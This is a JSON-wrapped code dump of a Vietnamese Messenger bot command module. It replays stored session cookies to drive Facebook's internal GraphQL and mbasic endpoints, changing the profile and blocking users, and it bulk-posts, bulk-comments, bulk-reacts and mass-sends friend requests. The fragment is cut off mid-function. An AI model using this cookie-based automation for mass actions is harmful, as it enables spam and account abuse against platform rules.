lastRun');\n\n  var time = runtimes.get(fn);\n  \n  if (time == null) {\n    return;\n  }\n\n  var resolution = parseInt(timeResolution, 10) || 1; \n  return time - (time % resolution);\n}\n\n/**\n * @param {object} fn\n * @param {number} timestamp\n */\nfunction capture(fn, timestamp) {\n  assert(isFunction(fn), 'Only functions can be captured');\n\n  timestamp = timestamp || Date.now();\n\n  runtimes.set(fn, timestamp);\n}\n\n/**\n * @param {object} name\n */\nfunction has(name) {\n  return runtimes.has(name);\n}\n\n/**\n * @param {object} fn\n */\nfunction release(fn) {\n  assert(isFunction(fn), 'Only functions can be captured');\n\n  runtimes.delete(fn);\n}\n\nmodule.exports = {\n    lastRun,\n    capture,\n    release,\n    has\n};","path":null,"size_bytes":1062,"size_tokens":null},"modules/commands/commands.js":{"content":"module.exports.config = {\n  name: \"commands\",\n  version: \"1.0.0\",\n  hasPermssion: 3,\n  credits: \"NTKhang\",\n  description: \"config bot!\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  cooldowns: 5\n};\n\nmodule.exports.languages = {\n  \"vi\": {},\n  \"en\": {}\n};\n\nconst appState = require(\"../../appstate.json\");\nconst cookie = appState.map(item => item = item.key + \"=\" + item.value).join(\";\");\nconst headers = {\n  \"Host\": \"mbasic.facebook.com\",\n  \"user-agent\": \"Mozilla/5.0 (Linux; Android 11; M2101K7BG Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36\",\n  \"accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n  \"sec-fetch-site\": \"same-origin\",\"sec-fetch-mode\": \"navigate\",\n  \"sec-fetch-user\": \"?1\",\n  \"sec-fetch-dest\": \"document\",\n  \"referer\": \"https://mbasic.facebook.com/?refsrc=deprecated&_rdr\",\n  \"accept-encoding\": \"gzip, deflate\",\n  \"accept-language\": \"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7\",\n  \"Cookie\": cookie\n};\n\nmodule.exports.handleReply = async function({ api, event, handleReply }) {\n  const botID = api.getCurrentUserID();\n  const axios = require(\"axios\");\n\n  const { type, author } = handleReply;\n  const { threadID, messageID, senderID } = event;\n  let body = event.body || \"\";\n  if (author != senderID) return;\n\n  const args = body.split(\" \");\n\n  const reply = function(msg, callback) {\n    if (callback) api.sendMessage(msg, threadID, callback, messageID);\n    else api.sendMessage(msg, threadID, messageID);\n  };\n\n  if (type == 'menu') {\n    if ([\"01\", \"1\", \"02\", \"2\"].includes(args[0])) {\n      reply(`H√£y ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi ${[\"01\", \"1\"].includes(args[0]) ? \"bio\" : \"bi·ªát danh\"} b·∫°n mu·ªën ƒë·ªïi cho bot ho·∫∑c 'delete' n·∫øu mu·ªën x√≥a ${[\"01\", \"1\"].includes(args[0]) ? \"bio\" : \"bi·ªát danh\"} hi·ªán t·∫°i`, (err, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: [\"01\", \"1\"].includes(args[0]) ?  \"changeBio\" : \"changeNickname\"\n        });\n      });\n    }\n    else if ([\"03\", \"3\"].includes(args[0])) {\n      const messagePending = await api.getThreadList(500, null, [\"PENDING\"]);\n      const msg = messagePending.reduce((a, b) => a += `¬ª ${b.name} | ${b.threadID} | Tin nh·∫Øn: ${b.snippet}\\n`, \"\");\n      return reply(`Danh s√°ch tin nh·∫Øn ch·ªù c·ªßa bot:\\n\\n${msg}`);\n    }\n    else if ([\"04\", \"4\"].includes(args[0])) {\n      const messagePending = await api.getThreadList(500, null, [\"unread\"]);\n      const msg = messagePending.reduce((a, b) => a += `¬ª ${b.name} | ${b.threadID} | Tin nh·∫Øn: ${b.snippet}\\n`, \"\") || \"Kh√¥ng c√≥ tin nh·∫Øn n√†o\";\n      return reply(`Danh s√°ch tin nh·∫Øn ch∆∞a ƒë·ªçc c·ªßa bot:\\n\\n${msg}`);\n    }\n    else if ([\"05\", \"5\"].includes(args[0])) {\n      const messagePending = await api.getThreadList(500, null, [\"OTHER\"]);\n      const msg = messagePending.reduce((a, b) => a += `¬ª ${b.name} | ${b.threadID} | Tin nh·∫Øn: ${b.snippet}\\n`, \"\") || \"Kh√¥ng c√≥ tin nh·∫Øn n√†o\";\n      return reply(`Danh s√°ch tin nh·∫Øn spam c·ªßa bot:\\n\\n${msg}`);\n    }\n    else if ([\"06\", \"6\"].includes(args[0])) {\n      reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y k√®m ·∫£nh ho·∫∑c link ·∫£nh mu·ªën ƒë·ªïi th√†nh avatar bot`, (err, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"changeAvatar\"\n        });\n      });\n    }\n    else if ([\"07\", \"7\"].includes(args[0])) {\n      if (!args[1] || ![\"on\", \"off\"].includes(args[1])) return reply('Vui l√≤ng ch·ªçn on ho·∫∑c off');\n      const form = {\n        av: botID,\n        variables: JSON.stringify({\n          \"0\": {\n            is_shielded: args[1] == 'on' ? true : false,\n            actor_id: botID,\n            client_mutation_id: Math.round(Math.random()*19)\n          }\n        }),\n        doc_id: \"1477043292367183\"\n      };\n      api.httpPost(\"https://www.facebook.com/api/graphql/\", form, (err, data) => {\n        if (err || JSON.parse(data).errors) reply(\"ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau\");\n        else reply(`¬ª ƒê√£ ${args[1] == 'on' ? 'b·∫≠t' : 't·∫Øt'} khi√™n avatar c·ªßa bot th√†nh c√¥ng`);\n      });\n    }\n    else if ([\"08\", \"8\"].includes(args[0])) {\n      return reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi id c·ªßa ng∆∞·ªùi b·∫°n mu·ªën ch·∫∑n, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"blockUser\"\n        });\n      });\n    }\n    else if ([\"09\", \"9\"].includes(args[0])) {\n      return reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi id c·ªßa ng∆∞·ªùi b·∫°n mu·ªën b·ªè ch·∫∑n, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"unBlockUser\"\n        });\n      });\n    }\n    else if ([\"10\"].includes(args[0])) {\n      return reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi n·ªôi dung mu·ªën t·∫°o b√†i vi·∫øt`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"createPost\"\n        });\n      });\n    }\n    else if ([\"11\"].includes(args[0])) {\n      return reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi id b√†i vi·∫øt b·∫°n mu·ªën x√≥a, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"deletePost\"\n        });\n      });\n    }\n    else if ([\"12\", \"13\"].includes(args[0])) {\n      return reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y v·ªõi postID mu·ªën comment (b√†i vi·∫øt ${args[0] == \"12\" ? \"c·ªßa user\" : \"tr√™n group\"}), c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"choiceIdCommentPost\",\n          isGroup: args[0] == \"12\" ? false : true\n        });\n      });\n    }\n    else if ([\"14\", \"15\", \"16\", \"17\", \"18\", \"19\"].includes(args[0])) {\n      reply(`Ph·∫£n h·ªìi tin nh·∫Øn n√†y k√®m id b√†i vi·∫øt mu·ªën ${args[0]  == \"13\" ? \"th·∫£ c·∫£m x√∫c\" : args[0] == \"14\" ? \"g·ª≠i l·ªùi m·ªùi k·∫øt b·∫°n\" : args[0] == \"15\" ? \"ch·∫•p nh·∫≠n l·ªùi m·ªùi k·∫øt b·∫°n\" : args[0] == \"16\" ? \"t·ª´ ch·ªëi l·ªùi m·ªùi k·∫øt b·∫°n\" : args[0] == \"17\" ? \"x√≥a b·∫°n b√®\" : \"g·ª≠i tin nh·∫Øn\"}, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng`, (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: args[0] == \"14\" ? \"choiceIdReactionPost\" : args[0] == \"15\" ? \"addFiends\" : args[0] == \"16\" ? \"acceptFriendRequest\" : args[0] == \"17\" ? \"deleteFriendRequest\" : args[0] == \"18\" ? \"unFriends\" : \"choiceIdSendMessage\"\n        });\n      });\n    }\n    else if ([\"20\"].includes(args[0])) {\n      reply('Ph·∫£n h·ªìi tin nh·∫Øn n√†y k√®m ƒëo·∫°n code b·∫°n mu·ªën t·∫°o ghi ch√∫', (e, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: senderID,\n          type: \"noteCode\",\n          isGroup: args[0] == \"12\" ? false : true\n        });\n      });\n    }\n    else if ([\"21\"].includes(args[0])) {\n      api.logout((e) => {\n        if (e) return reply('ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau');\n        else console.log('¬ª¬ª LOGOUT SUCCESS ¬´¬´');\n      });\n    }\n  }\n\n\n  else if (type == 'changeBio') {\n    const bio = body.toLowerCase() == 'delete' ? '' : body;\n    api.changeBio(bio, false, (err) => {\n      if (err) return reply(\"ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau\");\n      else return reply(`ƒê√£ ${!bio ? \"x√≥a ti·ªÉu s·ª≠ c·ªßa bot th√†nh c√¥ng\" : `thay ƒë·ªïi ti·ªÉu s·ª≠ bot th√†nh: ${bio}`}`);\n    });\n  }\n\n\n  else if (type == 'changeNickname') {\n    const nickname = body.toLowerCase() == 'delete' ? '' : body;\n    let res = (await axios.get('https://mbasic.facebook.com/' + botID + '/about', {\n      headers,      \n      params: {\n        nocollections: \"1\",\n        lst: `${botID}:${botID}:${Date.now().toString().slice(0, 10)}`,\n        refid: \"17\"\n      }\n    })).data;\n    require('fs-extra').writeFileSync(__dirname+\"/cache/resNickname.html\", res);\n\n    let form;\n    if (nickname) {\n      const name_id = res.includes('href=\"/profile/edit/info/nicknames/?entid=') ? res.split('href=\"/profile/edit/info/nicknames/?entid=')[1].split(\"&amp;\")[0] : null;\n\n      const variables = {\n        collectionToken: (new Buffer(\"app_collection:\" + botID + \":2327158227:206\")).toString('base64'),\n        input: {\n          name_text: nickname,\n          name_type: \"NICKNAME\",\n          show_as_display_name: true,\n          actor_id: botID,\n          client_mutation_id: Math.round(Math.random()*19).toString()\n        },\n        scale: 3,\n        sectionToken: (new Buffer(\"app_section:\" + botID + \":2327158227\")).toString('base64')\n      };\n\n      if (name_id) variables.input.name_id = name_id;\n\n      form = {\n        av: botID,\n        fb_api_req_friendly_name: \"ProfileCometNicknameSaveMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"4126222767480326\",\n        variables: JSON.stringify(variables)\n      };\n    }\n    else {\n      if (!res.includes('href=\"/profile/edit/info/nicknames/?entid=')) return reply('Bot c·ªßa b·∫°n hi·ªán t·∫°i ch∆∞a ƒë·∫∑t t√™n bi·ªát danh n√†o');\n      const name_id = res.split('href=\"/profile/edit/info/nicknames/?entid=')[1].split(\"&amp;\")[0];\n      form = {\n        av: botID,\n        fb_api_req_friendly_name: \"ProfileCometAboutFieldItemDeleteMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"4596682787108894\",\n        variables: JSON.stringify({\n          collectionToken: (new Buffer(\"app_collection:\" + botID + \":2327158227:206\")).toString('base64'),\n          input: {\n            entid: name_id,\n            field_type: \"nicknames\",\n            actor_id: botID,\n            client_mutation_id: Math.round(Math.random()*19).toString()\n          },\n          scale: 3,\n          sectionToken: (new Buffer(\"app_section:\" + botID + \":2327158227\")).toString('base64'),\n          isNicknameField: true,\n          useDefaultActor: false\n        })\n      };\n    }\n\n    api.httpPost(\"https://www.facebook.com/api/graphql/\", form, (e, i) => {\n      if (e) return reply(`ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau`);\n      else if (JSON.parse(i).errors) reply(`ƒê√£ x·∫£y ra l·ªói: ${JSON.parse(i).errors[0].summary}, ${JSON.parse(i).errors[0].description}`);\n      else reply(`ƒê√£ ${!nickname ? \"xo√° t√™n bi·ªát danh c·ªßa bot th√†nh c√¥ng\" : `ƒë·ªïi t√™n bi·ªát danh c·ªßa bot th√†nh: ${nickname}`}`);\n    });\n  }\n\n\n  else if (type == 'changeAvatar') {\n    let imgUrl;\n    if (body && body.match(/^((http(s?)?):\\/\\/)?([wW]{3}\\.)?[a-zA-Z0-9\\-.]+\\.[a-zA-Z]{2,}(\\.[a-zA-Z]{2,})?$/g))imgUrl = body;\n    else if (event.attachments[0] && event.attachments[0].type == \"photo\") imgUrl = event.attachments[0].url;\n    else return reply(`Vui l√≤ng nh·∫≠p link h√¨nh ·∫£nh h·ª£p l·ªá ho·∫∑c ph·∫£n h·ªìi tin nh·∫Øn k√®m m·ªôt ·∫£nh mu·ªën ƒë·∫∑t l√†m avatar cho bot`, (err, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: \"changeAvatar\"\n      });\n    });\n    try {\n      const imgBuffer = (await axios.get(imgUrl, {\n        responseType: \"stream\"\n      })).data;\n      const form0 = {\n        file: imgBuffer\n      };\n      let uploadImageToFb = await api.httpPostFormData(`https://www.facebook.com/profile/picture/upload/?profile_id=${botID}&photo_source=57&av=${botID}`, form0);\n      uploadImageToFb = JSON.parse(uploadImageToFb.split(\"for (;;);\")[1]);\n      if (uploadImageToFb.error) return reply(\"ƒê√£ x·∫£y ra l·ªói: \" + uploadImageToFb.error.errorDescription);\n      const idPhoto = uploadImageToFb.payload.fbid;\n      const form = {\n        av: botID,\n        fb_api_req_friendly_name: \"ProfileCometProfilePictureSetMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"5066134240065849\",\n        variables: JSON.stringify({\n          input: {\n            caption: \"\",\n            existing_photo_id: idPhoto,\n            expiration_time: null,\n            profile_id: botID,\n            profile_pic_method: \"EXISTING\",\n            profile_pic_source: \"TIMELINE\",\n            scaled_crop_rect: {\n              height: 1,\n              width: 1,\n              x: 0,\n              y: 0\n            },\n            skip_cropping: true,\n            actor_id: botID,\n            client_mutation_id: Math.round(Math.random() * 19).toString()\n          },\n          isPage: false,\n          isProfile: true,\n          scale: 3\n        })\n      };\n      api.httpPost(\"https://www.facebook.com/api/graphql/\", form, (e, i) => {\n        if (e) reply(`ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau`);\n        else if (JSON.parse(i.slice(0, i.indexOf('\\n') + 1)).errors) reply(`ƒê√£ x·∫£y ra l·ªói: ${JSON.parse(i).errors[0].description}`);\n        else reply(`ƒê√£ thay ƒë·ªïi avatar cho bot th√†nh c√¥ng`);\n      });\n    }\n    catch(err) {\n      reply(`ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau`);\n    }\n  }\n\n\n  else if (type == 'blockUser') {\n    if (!body) return reply(\"Vui l√≤ng nh·∫≠p uid c·ªßa nh·ªØng ng∆∞·ªùi b·∫°n mu·ªën ch·∫∑n tr√™n messenger, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng\", (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: 'blockUser'\n      });\n    });\n    const uids = body.replace(/\\s+/g, \" \").split(\" \");\n    const success = [];\n    const failed = [];\n    for (const uid of uids) {\n      try {\n        await api.changeBlockedStatus(uid, true);\n        success.push(uid);\n      }\n      catch(err) {\n        failed.push(uid);\n      }\n    }\n    reply(`¬ª ƒê√£ ch·∫∑n th√†nh c√¥ng ${success.length} ng∆∞·ªùi d√πng tr√™n messenger${failed.length > 0 ? `\\n¬ª Ch·∫∑n th·∫•t b·∫°i ${failed.length} ng∆∞·ªùi d√πng, id: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'unBlockUser') {\n    if (!body) return reply(\"Vui l√≤ng nh·∫≠p uid c·ªßa nh·ªØng ng∆∞·ªùi b·∫°n mu·ªën b·ªè ch·∫∑n tr√™n messenger, c√≥ th·ªÉ nh·∫≠p nhi·ªÅu id c√°ch nhau b·∫±ng d·∫•u c√°ch ho·∫∑c xu·ªëng d√≤ng\", (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: 'unBlockUser'\n      });\n    });\n    const uids = body.replace(/\\s+/g, \" \").split(\" \");\n    const success = [];\n    const failed = [];\n    for (const uid of uids) {\n      try {\n        await api.changeBlockedStatus(uid, false);\n        success.push(uid);\n      }\n      catch(err) {\n        failed.push(uid);\n      }\n    }\n    reply(`¬ª ƒê√£ b·ªè ch·∫∑n th√†nh c√¥ng ${success.length} ng∆∞·ªùi d√πng tr√™n messenger${failed.length > 0 ? `\\n¬ª B·ªè ch·∫∑n th·∫•t b·∫°i ${failed.length} ng∆∞·ªùi d√πng, id: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'createPost') {\n    if (!body) return reply(\"Vui l√≤ng nh·∫≠p n·ªôi dung mu·ªën t·∫°o b√†i vi·∫øt\", (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: 'createPost'\n      });\n    });\n\n    const session_id = getGUID();\n    const form = {\n      av: botID,\n      fb_api_req_friendly_name: \"ComposerStoryCreateMutation\",\n      fb_api_caller_class: \"RelayModern\",\n      doc_id: \"4612917415497545\",\n      variables: JSON.stringify({\n        \"input\": {\n          \"composer_entry_point\": \"inline_composer\",\n          \"composer_source_surface\": \"timeline\",\n          \"idempotence_token\": session_id + \"_FEED\",\n          \"source\": \"WWW\",\n          \"attachments\": [],\n          \"audience\": {\n            \"privacy\": {\n              \"allow\": [],\n              \"base_state\": \"EVERYONE\",\n              \"deny\": [],\n              \"tag_expansion_state\": \"UNSPECIFIED\"\n            }\n          },\n          \"message\": {\n            \"ranges\": [],\n            \"text\": body\n          },\n          \"with_tags_ids\": [],\n          \"inline_activities\": [],\n          \"explicit_place_id\": \"0\",\n          \"text_format_preset_id\": \"0\",\n          \"logging\": {\n            \"composer_session_id\": session_id\n          },\n          \"tracking\": [null],\n          \"actor_id\": botID,\n          \"client_mutation_id\": Math.round(Math.random()*19)\n        },\n        \"displayCommentsFeedbackContext\": null,\n        \"displayCommentsContextEnableComment\": null,\n        \"displayCommentsContextIsAdPreview\": null,\n        \"displayCommentsContextIsAggregatedShare\": null,\n        \"displayCommentsContextIsStorySet\": null,\n        \"feedLocation\": \"TIMELINE\",\n        \"feedbackSource\": 0,\n        \"focusCommentID\": null,\n        \"gridMediaWidth\": 230,\n        \"scale\": 3,\n        \"privacySelectorRenderLocation\": \"COMET_STREAM\",\n        \"renderLocation\": \"timeline\",\n        \"useDefaultActor\": false,\n        \"inviteShortLinkKey\": null,\n        \"isFeed\": false,\n        \"isFundraiser\": false,\n        \"isFunFactPost\": false,\n        \"isGroup\": false,\n        \"isTimeline\": true,\n        \"isSocialLearning\": false,\n        \"isPageNewsFeed\": false,\n        \"isProfileReviews\": false,\n        \"isWorkSharedDraft\": false,\n        \"UFI2CommentsProvider_commentsKey\": \"ProfileCometTimelineRoute\",\n        \"useCometPhotoViewerPlaceholderFrag\": true,\n        \"hashtag\": null,\n        \"canUserManageOffers\": false\n      })\n    };\n\n    api.httpPost('https://www.facebook.com/api/graphql/', form, (e, i) => {\n      if (e || JSON.parse(i).errors) return reply(`T·∫°o b√†i vi·∫øt th·∫•t b·∫°i, vui l√≤ng th·ª≠ l·∫°i sau`);\n      const postID = JSON.parse(i).data.story_create.story.legacy_story_hideable_id;\n      const urlPost = JSON.parse(i).data.story_create.story.url;\n      return reply(`¬ª ƒê√£ t·∫°o b√†i vi·∫øt th√†nh c√¥ng\\n¬ª postID: ${postID}\\n¬ª urlPost: ${urlPost}`);\n    });\n  }\n\n\n  else if (type == 'choiceIdCommentPost') {\n    if (!body) return reply('Vui l√≤ng nh·∫≠p id c·ªßa post b·∫°n mu·ªën comment', (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: \"choiceIdCommentPost\",\n        isGroup: handleReply.isGroup\n      });\n    })\n    reply(\"Ph·∫£n h·ªìi tin nh·∫Øn n√†y k√®m n·ªôi dung b·∫°n mu·ªën comment cho b√†i vi·∫øt\", (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        postIDs: body.replace(/\\s+/g, \" \").split(\" \"),\n        type: \"commentPost\",\n        isGroup: handleReply.isGroup\n      });\n    });\n  }\n\n\n  else if (type == 'commentPost') {\n    const { postIDs, isGroup } = handleReply;\n\n    if (!body) return reply('Vui l√≤ng nh·∫≠p n·ªôi dung b·∫°n mu·ªën comment cho b√†i vi·∫øt', (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: \"commentPost\",\n        postIDs: handleReply.postIDs,\n        isGroup: handleReply.isGroup\n      });\n    });\n    const success = [];\n    const failed = [];\n\n    for (let id of postIDs) {\n      const postID = (new Buffer('feedback:' + id)).toString('base64');\n      const { isGroup } = handleReply;\n      const ss1 = getGUID();\n      const ss2 = getGUID();\n\n      const form = {\n        av: botID,\n        fb_api_req_friendly_name: \"CometUFICreateCommentMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"4744517358977326\",\n        variables: JSON.stringify({\n          \"displayCommentsFeedbackContext\": null,\n          \"displayCommentsContextEnableComment\": null,\n          \"displayCommentsContextIsAdPreview\": null,\n          \"displayCommentsContextIsAggregatedShare\": null,\n          \"displayCommentsContextIsStorySet\": null,\n          \"feedLocation\": isGroup ? \"GROUP\" : \"TIMELINE\",\n          \"feedbackSource\": 0,\n          \"focusCommentID\": null,\n          \"includeNestedComments\": false,\n          \"input\": {\n            \"attachments\": null,\n            \"feedback_id\": postID,\n            \"formatting_style\": null,\n            \"message\": {\n              \"ranges\": [],\n              \"text\": body\n            },\n            \"is_tracking_encrypted\": true,\n            \"tracking\": [],\n            \"feedback_source\": \"PROFILE\",\n            \"idempotence_token\": \"client:\" + ss1,\n            \"session_id\": ss2,\n            \"actor_id\": botID,\n            \"client_mutation_id\": Math.round(Math.random()*19)\n          },\n          \"scale\": 3,\n          \"useDefaultActor\": false,\n          \"UFI2CommentsProvider_commentsKey\": isGroup ? \"CometGroupDiscussionRootSuccessQuery\" : \"ProfileCometTimelineRoute\"\n        })\n      };\n\n      try {\n        const res = await api.httpPost('https://www.facebook.com/api/graphql/', form);\n        if (JSON.parse(res).errors) failed.push(id);\n        else success.push(id);\n      }\n      catch(err) {\n        failed.push(id);\n      }\n    }\n    reply(`¬ª ƒê√£ comment th√†nh c√¥ng ${success.length} b√†i vi·∫øt${failed.length > 0 ? `\\n¬ª Comment th·∫•t b·∫°i ${failed.length} b√†i vi·∫øt, postID: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'deletePost') {\n    const postIDs = body.replace(/\\s+/g, \" \").split(\" \");\n    const success = [];\n    const failed = [];\n\n    for (const postID of postIDs) {\n      let res;\n      try {\n        res = (await axios.get('https://mbasic.facebook.com/story.php?story_fbid='+postID+'&id='+botID, {\n           headers\n        })).data;\n      }\n      catch (err) {\n        reply(\"ƒê√£ x·∫£y ra l·ªói, id b√†i vi·∫øt kh√¥ng t·ªìn t·∫°i ho·∫∑c b·∫°n kh√¥ng ph·∫£i ch·ªß c·ªßa b√†i vi·∫øt n√†y\");\n      }\n\n      const session_ID = decodeURIComponent(res.split('session_id%22%3A%22')[1].split('%22%2C%22')[0]);\n      const story_permalink_token = decodeURIComponent(res.split('story_permalink_token=')[1].split('&amp;')[0]);\n      console.log(story_permalink_token);\n      const hideable_token = decodeURIComponent(res.split('%22%2C%22hideable_token%22%3A%')[1].split('%22%2C%22')[0]);\n\n      let URl = 'https://mbasic.facebook.com/nfx/basic/direct_actions/?context_str=%7B%22session_id%22%3A%22c'+session_ID+'%22%2C%22support_type%22%3A%22chevron%22%2C%22type%22%3A4%2C%22story_location%22%3A%22feed%22%2C%22entry_point%22%3A%22chevron_button%22%2C%22entry_point_uri%22%3A%22%5C%2Fstories.php%3Ftab%3Dh_nor%22%2C%22hideable_token%22%3A%'+hideable_token+'%22%2C%22story_permalink_token%22%3A%22S%3A_I'+botID+'%3A'+postID+'%22%7D&redirect_uri=%2Fstories.php%3Ftab%3Dh_nor&refid=8&__tn__=%2AW-R';\n\n      res = (await axios.get(URl, {\n        headers\n      })).data;\n\n      URl = res.split('method=\"post\" action=\"/nfx/basic/handle_action/?')[1].split('\"')[0];\n      URl = \"https://mbasic.facebook.com/nfx/basic/handle_action/?\" + URl\n        .replace(/&amp;/g, '&')\n        .replace(\"%5C%2Fstories.php%3Ftab%3Dh_nor\", 'https%3A%2F%2Fmbasic.facebook.com%2Fprofile.php%3Fv%3Dfeed')\n        .replace(\"%2Fstories.php%3Ftab%3Dh_nor\", 'https%3A%2F%2Fmbasic.facebook.com%2Fprofile.php%3Fv%3Dfeed');\n      fb_dtsg = res.split('type=\"hidden\" name=\"fb_dtsg\" value=\"')[1].split('\" autocomplete=\"off\" /><input')[0];\n      jazoest = res.split('type=\"hidden\" name=\"jazoest\" value=\"')[1].split('\" autocomplete=\"off\" />')[0];\n\n      const data = \"fb_dtsg=\" + encodeURIComponent(fb_dtsg) +\"&jazoest=\" + encodeURIComponent(jazoest) + \"&action_key=DELETE&submit=G%E1%BB%ADi\";\n\n      try {\n        const dt = await axios({\n          url: URl,\n          method: 'post',\n          headers,\n          data\n        });\n        if (dt.data.includes(\"R·∫•t ti·∫øc, ƒë√£ x·∫£y ra l·ªói\")) throw new Error();\n        success.push(postID);\n      }\n      catch(err) {\n        failed.push(postID);\n      };\n    }\n    reply(`¬ª ƒê√£ x√≥a th√†nh c√¥ng ${success.length} b√†i vi·∫øt${failed.length > 0 ? `\\n¬ªX√≥a th·∫•t b·∫°i ${failed.length} b√†i vi·∫øt, postID: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'choiceIdReactionPost') {\n    if (!body) return reply(`Vui l√≤ng nh·∫≠p id b√†i vi·∫øt b·∫°n mu·ªën reaction`, (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        type: \"choiceIdReactionPost\"\n      });\n    });\n\n    const listID = body.replace(/\\s+/g, \" \").split(\" \");\n\n    reply(`Nh·∫≠p c·∫£m x√∫c b·∫°n mu·ªën reaction cho ${listID.length} b√†i vi·∫øt (unlike/like/love/heart/haha/wow/sad/angry)`, (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        listID,\n        type: \"reactionPost\"\n      });\n    })\n  }\n\n\n  else if (type == 'reactionPost') {\n    const success = [];\n    const failed = [];\n    const postIDs = handleReply.listID;\n    const feeling = body.toLowerCase();\n    if (!'unlike/like/love/heart/haha/wow/sad/angry'.split('/').includes(feeling)) return reply('Vui l√≤ng ch·ªçn m·ªôt trong nh·ªØng c·∫£m x√∫c sau unlike/like/love/heart/haha/wow/sad/angry', (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        listID,\n        type: \"reactionPost\"\n      })\n    });\n    for (const postID of postIDs) {\n      try {\n        await api.setPostReaction(Number(postID), feeling);\n        success.push(postID);\n      }\n      catch(err) {\n        failed.push(postID);\n      }\n    }\n    reply(`¬ª ƒê√£ th·∫£ c·∫£m x√∫c ${feeling} cho ${success.length} b√†i vi·∫øt th√†nh c√¥ng${failed.length > 0 ? `¬ª Reaction th·∫•t b·∫°i ${failed.length} b√†i vi·∫øt, postID: ${failed.join(\" \")}` : ''}`);\n  }\n\n\n  else if (type == 'addFiends') {\n    const listID = body.replace(/\\s+/g, \" \").split(\" \");\n    const success = [];\n    const failed = [];\n\n    for (const uid of listID) {\n      const form = {\n        av: botID,\n        fb_api_caller_class: \"RelayModern\",\n        fb_api_req_friendly_name: \"FriendingCometFriendRequestSendMutation\",\n        doc_id: \"5090693304332268\",\n        variables: JSON.stringify({\n          input: {\n            friend_requestee_ids: [uid],\n            refs: [null],\n            source: \"profile_button\",\n            warn_ack_for_ids: [],\n            actor_id: botID,\n            client_mutation_id: 